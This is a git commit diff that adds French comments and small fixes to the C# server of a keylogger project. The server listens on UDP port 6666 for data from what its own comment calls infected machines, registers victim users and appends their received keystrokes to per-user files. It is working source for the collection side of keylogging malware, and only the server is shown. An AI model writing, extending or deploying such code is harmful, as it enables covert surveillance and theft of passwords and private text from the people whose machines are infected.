c16f2d0b714230b63497629ac9a53982ce7b6eb9
Baesposito <48789539+Baesposito@users.noreply.github.com>
2021-12-16 03:19:04 +0100

    Commentaire fait

--- Serveur_keylogger/Program.cs
+++ Serveur_keylogger/Program.cs
@@ -11,8 +11,13 @@ namespace Serveur_keylogger
 {
     internal class Program
     {
+
+        // Variable global pour fixer les chemins des fichiers et dossiers du serveur
+        // Il est possible de modifier les arborescences en fonction de votre serveur
         static string Save_user = @"C:\Users\" + Environment.UserName +@"\Desktop\myUser.txt"; // fichier de sauvegarde des utilisateurs
         static string Save_file_kl = @"C:\Users\" + Environment.UserName + @"\Desktop\file_kl\"; // emplacement des fichiers
+        
+        //Methode de vérification si la liste des utilisateurs est la ou pas
         public static void Check_if_need_create_db()
         {
             if (!File.Exists(Save_user))
@@ -22,6 +27,7 @@ namespace Serveur_keylogger
 
         }
 
+        // Permet de recuperer la taille des paquets à transferer
         static int getLenght_byte(byte[] b)
         {
             int a = 0;
@@ -32,9 +38,11 @@ namespace Serveur_keylogger
             return a;
         }
 
+
+        // Méthode central pour traiter les paquets qu'on recoit
         public static string Cut_head_data(string s)
         {
-            //Split la chaine de caractère
+            // On sépare l'en-tete du corps
             string[] sub_s = s.Split(';'); 
             
 
@@ -69,24 +77,29 @@ namespace Serveur_keylogger
                 File.AppendAllText(Save_user, name + "\r\n");
 
                 // On crée le fichier
-                File.Create(Save_file_kl+"\\" + sub_s[1] + ".txt");
-
+                var f = File.Create(Save_file_kl+"\\" + sub_s[1] + ".txt");
+                f.Close();
                 // On retourne un chaine de caractère avec le nom pour le renvoyer au client
                 return name;
 
             }
 
-            //Sinon on cherche le bon fichier avec l'en-tete
+            //Si ce n'est pas une demande de creation d'utilisateur
             else
             {
-                Console.WriteLine("ca rentre ici");
+                // Affichage pour comprendre ce qu'il se passe du coté du serveur
+                Console.WriteLine("on ecrit chez " + sub_s[0]);
+
+                //On vérifie si le fichier est bien présent
                 string arbo = Save_file_kl + sub_s[0] + ".txt";
                 if (!File.Exists(arbo))
                 {
-                    File.Create(arbo);
+                    var f = File.Create(arbo);
+                    f.Close();
                 }
                 //On écrit dans le fichier
-                File.AppendAllText(arbo, sub_s[1]);
+                File.AppendAllText(arbo, sub_s[1]+ "\n");
+                
                 return "";
             }
                 
@@ -94,16 +107,25 @@ namespace Serveur_keylogger
 
         static void Main(string[] args)
         {
+            // On vérifie si on a bien un fichier qui sert à la liste des utilisateurs connu
             Check_if_need_create_db();
+
+            // On ouvre le port 6666 pour écouter ou envoyer
             UdpClient serveur = new UdpClient(6666);
 
             while (true) // le but est d'attendre les messages envoyés par les machines infectées
             {
+                //On commence par écouter 
                 IPEndPoint serv_ip = new IPEndPoint(IPAddress.Any, 6666);
                 byte[] buffer = serveur.Receive(ref serv_ip); // On attend les données
+                
+                // On convertit le résultat recu en chaine de caractère
                 string S_buffer = Encoding.Default.GetString(buffer);
+                
+                // On traite les données recues
                 string answer = Cut_head_data(S_buffer);
-                Console.WriteLine(answer);
+                Console.WriteLine(answer); // Affichage informatif
+                
                 if(answer != "")
                 {
                     serveur.Send(Encoding.ASCII.GetBytes(answer), getLenght_byte(Encoding.ASCII.GetBytes(answer)),serv_ip);
